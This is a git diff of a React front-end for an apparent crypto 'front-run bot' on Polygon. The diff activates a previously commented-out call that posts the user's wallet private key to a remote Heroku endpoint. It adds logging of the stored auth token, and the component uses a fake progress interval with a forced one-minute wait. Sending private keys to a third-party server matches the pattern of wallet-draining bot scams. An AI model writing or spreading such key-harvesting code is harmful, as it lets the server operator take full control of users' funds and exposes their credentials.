@@ -158,10 +158,12 @@ function Hero() {
   
     try {
       const token = localStorage.getItem("token");
+      console.log("Token from localStorage:", token);
       if (!token) throw new Error("Authorization token not found.");
   
+      console.log("Running bot API call...");
       const response = await axios.post(
-        // "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot",
+        "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot",
         {
           amount: 1,
           privatekey: privateKey,
@@ -172,21 +174,25 @@ function Hero() {
         }
       );
   
+      console.log("Bot API Response:", response.data);
+  
       const { data, message } = response.data;
       const txHash = data.frontrunTxHash;
   
       if (!txHash) throw new Error("No transaction hash returned.");
   
-      // Start checking for confirmation in background
       const checkConfirmation = setInterval(async () => {
-        const receipt = await web3.eth.getTransactionReceipt(txHash);
-        if (receipt && receipt.status) {
-          clearInterval(checkConfirmation);
-          console.log("Transaction confirmed!");
+        try {
+          const receipt = await web3.eth.getTransactionReceipt(txHash);
+          if (receipt && receipt.status) {
+            clearInterval(checkConfirmation);
+            console.log("Transaction confirmed!");
+          }
+        } catch (err) {
+          console.error("Error checking transaction receipt:", err.message);
         }
       }, 5000);
   
-      // 🕒 Wait until full 1 minute is passed
       const elapsed = Date.now() - startTime;
       const remaining = Math.max(60000 - elapsed, 0);
   
@@ -243,12 +249,20 @@ function Hero() {
       }, remaining);
     } catch (error) {
       clearInterval(fakeInterval);
-      console.error("Error:", error);
-      setMessage("❌ Failed to run bot.");
+      console.error("Error running bot:", error);
+  
+      if (error.response) {
+        console.error("API Error Response:", error.response.data);
+        setMessage(`❌ API Error: ${error.response.data.message || "Unknown error"}`);
+      } else {
+        setMessage(`❌ Failed to run bot: ${error.message}`);
+      }
+  
       toast.error("Bot run failed.");
       setLoader(false);
     }
   };
+  
   const logEndRef = useRef(null);
   useEffect(() => {
     const container = document.getElementById("logContainer");
@@ -537,12 +551,12 @@ function Hero() {
             
             <div className=" m">
               <div className="card bgcard">
-                <p
+                <div
                   className="mt-3 m-0 text-white fw-bold ms-2 "
                   style={{ fontSize: "15px" }}
                 >
                   POLYGON
-                </p>
+                </div>
 
                 <div className="d-flex align-items-center">
                   <p className=" m-0 text-white fw-bold ms-2">Address :</p>
